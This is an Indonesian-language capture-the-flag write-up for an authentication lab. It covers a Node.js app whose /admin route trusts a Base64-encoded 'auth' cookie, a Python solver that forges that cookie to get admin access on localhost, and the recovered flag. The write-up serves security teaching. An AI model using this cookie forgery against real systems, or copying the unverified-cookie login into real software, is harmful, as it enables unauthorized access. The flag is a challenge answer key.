# WriteUp: Akun admin

## Overview

* **Judul:** Akun admin
* **Kategori:** Authentication
* **Poin:** 250 (Estimasi)
* **Deskripsi:** Masuk sebagai admin untuk mendapatkan flag.
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1338`

## Informasi Attachment

File yang diberikan adalah `akun-admin1.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin]
└─$ tree
.
├── akun-admin1.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`akun-admin1.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/auth1:latest
    ports:
      - "1337:3000"
    environment:
      - PWN=${PWN:-testuser}
    deploy:
      resources:
        limits:
          cpus: "0.50"
          memory: 256M
        reservations:
          cpus: "0.25"
          memory: 128M

```

*(Catatan: Bagian `deploy` dihapus dan port diubah ke 1338 karena port 1337 sedang digunakan).*

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose dengan port yang dimodifikasi ke **1338**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin]
└─$ PWN=WanZKey docker compose -f akun-admin1.yml up -d --build
[+] up 1/1
 ✔ Container akunadmin-web-1 Created

```

### 2. Reconnaissance (White Box)

Melakukan pengecekan environment container untuk menemukan lokasi source code aplikasi. Diketahui aplikasi berjalan menggunakan Node.js (terlihat dari `node server.js` di process list).

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin]
└─$ docker exec akunadmin-web-1 ps aux
PID    USER      TIME  COMMAND
    1 root       0:00 node server.js
   47 root       0:00 ps aux

┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin]
└─$ docker exec akunadmin-web-1 ls -la /usr/src/app
total 148
drwxr-xr-x    1 root     root          4096 Jan 15 07:07 .
drwxr-xr-x    1 root     root          4096 Jan 14 18:11 ..
-rw-r--r--    1 root     root         16384 Jan 15 07:07 database.sqlite
drwxr-xr-x  187 root     root          4096 Jan 14 18:12 node_modules
-rw-r--r--    1 root     root        100184 Jan 14 18:12 package-lock.json
-rw-r--r--    1 root     root           363 Jan 10 03:59 package.json
drwxr-xr-x    3 root     root          4096 Jan 10 03:57 public
-rw-r--r--    1 root     root          3159 Jan 10 04:00 server.js
drwxr-xr-x    2 root     root          4096 Jan 10 03:58 views

```

### 3. Source Code Analysis

Membaca file `server.js` untuk memahami logika autentikasi admin.

**Snippet Code (`server.js`):**

```javascript
// ...
// Helper to encode/decode Base64
const toBase64 = (str) => Buffer.from(str).toString('base64');
const fromBase64 = (str) => Buffer.from(str, 'base64').toString('ascii');

// ...

app.get('/admin', (req, res) => {
    const auth = req.cookies.auth; // Mengambil cookie 'auth'
    if (!auth) return res.redirect('/login');

    try {
        const username = fromBase64(auth); // Decode Base64
        if (username === 'admin') { // Cek string 'admin'
            return res.render('admin', { flag: process.env.FLAG || 'pwn{test_flag}' });
        }
        res.render('error', { message: 'Access Denied. Admins only.' });
    } catch (e) {
        res.redirect('/login');
    }
});
// ...

```

**Vulnerability Analysis:**
Aplikasi memiliki celah **Broken Authentication / Insecure Cookie Handling**.
Aplikasi mempercayai isi cookie `auth` sepenuhnya tanpa memvalidasi session ID atau password di sisi server. Aplikasi hanya melakukan decode Base64 pada nilai cookie tersebut. Jika hasil decode adalah string `admin`, maka akses ke endpoint `/admin` diberikan.

Serangan dapat dilakukan dengan memalsukan cookie `auth` berisi string `admin` yang di-encode Base64 (`YWRtaW4=`).

## Script Solver

Script ini membuat request ke endpoint `/admin` dengan menyertakan cookie `auth` yang telah dimanipulasi.

**File:** `exploit.py`

```python
import requests
import base64
import re

# Sesuaikan port
URL = "http://localhost:1338/admin"

def exploit():
    print("[*] Target:", URL)
    
    # 1. Bikin Payload Cookie: 'admin' -> Base64
    payload = base64.b64encode(b'admin').decode()
    print(f"[*] Forging Cookie: auth={payload}")
    
    # 2. Kirim Request dengan Cookie Palsu
    cookies = {'auth': payload}
    
    try:
        r = requests.get(URL, cookies=cookies)
        
        # 3. Cek Flag
        if r.status_code == 200:
            print("[+] Admin Access Granted!")
            # Cari format flag pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed. Response sample:")
                print(r.text[:200])
        else:
            print(f"[-] Failed. Status Code: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

**Output Terminal Solver:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin]
└─$ python3 exploit.py
[*] Target: http://localhost:1338/admin
[*] Forging Cookie: auth=YWRtaW4=
[+] Admin Access Granted!

[!!!] FLAG FOUND: pwn{7ddb57193926fba1b81ad6e29142b7b6}

```

## Flag

```
pwn{7ddb57193926fba1b81ad6e29142b7b6}

```
